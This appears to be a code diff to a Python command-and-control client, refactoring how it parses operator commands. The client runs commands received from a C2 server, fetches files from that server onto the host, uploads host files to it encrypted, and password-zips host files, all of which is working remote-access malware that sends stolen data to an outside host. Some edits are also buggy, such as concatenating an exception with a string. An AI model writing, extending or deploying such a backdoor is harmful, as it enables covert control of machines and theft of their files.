@@ -19,7 +19,17 @@ def post_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
         encrypt_msg = cipher.encrypt(msg.encode())
         post(f"http://{C2_SERVER}:{PORT}{response_path}", data={response_key: encrypt_msg}, headers=HEADER, proxies=PROXY)
     except exceptions.RequestException as e:
-        return e
+        return print(e + "\n")
+    
+def get_third_item(input_string, replace=True):
+    """This function that splits a str & return the 3rd item reformatted ;)"""
+    try:
+        if replace:
+            return input_string.split()[2].replace("\\", "/")
+        else:
+            return input_string.split()[2]
+    except IndexError:
+        post_to_server(f"You must enter a argument after {input_string}.\n")
 
 # Check the operating system
 if platform.system() == "Windows":
@@ -64,51 +74,50 @@ while True:
         post_to_server(cmd_output.stdout.decode())
 
     elif cmd.startswith('client download'):
-        filename = None
+        filepath = get_third_item(cmd)
+        if filepath is None: #IndexError / start new iteration
+            continue
+        filename = path.basename(filepath)
+        encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
         try:
-            filepath = cmd.split()[2] # command client download FILENAME
-            filename = filepath.replace("\\", "/").rsplit("/", 1)[-1] # clean windows backslash
-            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
             with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:
                     if response.status_code == HTTPStatusCode.OK.value:
                         with open(filename, "wb") as file_handle:
                             # Decrypt the response content and write the file out to disk, then notify us on the server
                             file_handle.write(cipher.decrypt(response.content))
                         post_to_server(f"{filename} is now on {client}.\n")
-        except IndexError:
-            post_to_server("You must enter the filename to download.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
     elif cmd.startswith('client upload'):
-        filepath = None
+        filepath = get_third_item(cmd)
+        if filepath is None: #IndexError / start new iteration
+            continue
+        filename = path.basename(filepath)
+        encrypted_filename = cipher.encrypt(filename.encode()).decode()
         try:
-            filepath = cmd.split()[2] # command client download FILENAME
-            filename = filepath.rsplit("/", 1)[-1] 
-            encrypted_filename = cipher.encrypt(filename.encode()).decode()
             with open(filepath, "rb") as file_handle:
                 encrypted_file = cipher.encrypt(file_handle.read())
                 put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, headers=HEADER, proxies=PROXY)
-        except IndexError:
-            post_to_server("You must enter the filepath to upload.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
         
     elif cmd.startswith('client zip'):
-        filepath = None
+        filepath = get_third_item(cmd)
+        if filepath is None: #IndexError / start new iteration
+            continue
+        filename = path.basename(filepath)
         try:
             filepath = cmd.split()[2] # command client download FILENAME
             
             with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                 zip_file.setpassword(ZIP_PASSWORD)
-                
+
                 if path.isdir(filepath):
                     post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n") # v1.0 of zipper
                 else:
                     zip_file.write(filepath)
                     post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
-        except IndexError:
-            post_to_server("You must enter the filepath to zip.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
